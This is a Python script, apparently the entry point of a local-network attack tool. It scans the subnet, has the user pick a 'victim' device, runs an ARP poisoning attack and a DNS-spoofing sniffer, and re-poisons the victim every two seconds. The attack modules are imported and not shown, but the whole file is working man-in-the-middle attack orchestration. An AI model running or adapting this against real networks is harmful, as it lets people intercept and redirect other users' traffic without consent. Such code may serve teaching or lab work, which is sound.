from __future__ import unicode_literals
from scapy.all import get_if_list
from prompt_toolkit.shortcuts import radiolist_dialog, input_dialog, message_dialog
from arp_poison import ARPPoisonAttack
from client import Client
from netifaces import ifaddresses, AF_INET
from ipaddress import ip_network
from dns_spoof import Sniffer
from time import sleep

from network_scan import NetworkScan
from utils import stu, uts

iface = uts(radiolist_dialog(
    title="Interface",
    text="Select the interface to use",
    values=[
        (stu(v), stu(v)) for v in get_if_list()
    ]
))

if iface == None:
    exit()

addresses = ifaddresses(iface)[AF_INET]
network = None

if len(addresses) == 0:
    cidr = uts(input_dialog(
        title='Address Range',
        text='Could not automatically determine IP range to use. Please enter an IP range in CIDR notation manually.'
    ))

    network = ip_network(cidr)
else:
    network = ip_network((addresses[0]['addr'], addresses[0]['netmask']), strict=False)

cidr = str(network)

scan = NetworkScan(iface, cidr)
clients = scan.execute()

if(len(clients) == 0):
    message_dialog(
        title='No network devices found',
        text='No clients have been found.',
        ok_text='Exit'
    )

    exit()

victim = radiolist_dialog(
    title='Select network device',
    text='Please select a victim:',
    values=[
        (c, stu(c.getMAC()) + ' - ' + stu(c.getIP())) for c in clients
    ]
)

arpAttack = ARPPoisonAttack(iface, victim, clients)
arpAttack.execute()

sniffer = Sniffer()

print("[*] Start sniffing...")
sniffer.start()

try:
    while True:
        sleep(2)
        arpAttack.execute()
except KeyboardInterrupt:
    print("[*] Stop sniffing")
    sniffer.join(2.0)

    if sniffer.isAlive():
        sniffer.socket.close()